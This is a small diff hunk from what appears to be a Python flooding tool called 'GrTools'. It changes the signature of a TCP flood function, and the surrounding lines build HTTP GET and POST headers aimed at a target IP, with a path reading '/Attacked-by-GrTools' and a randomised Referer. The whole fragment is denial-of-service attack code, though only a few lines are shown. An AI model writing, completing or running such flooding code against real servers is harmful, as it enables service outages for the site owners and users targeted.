@@ -159,7 +159,7 @@ method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods 
 
 if method == "TCP":
 
-    def tcpfl(ip, port):
+    def tcpfl():
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(https) + ip + "\r\n"
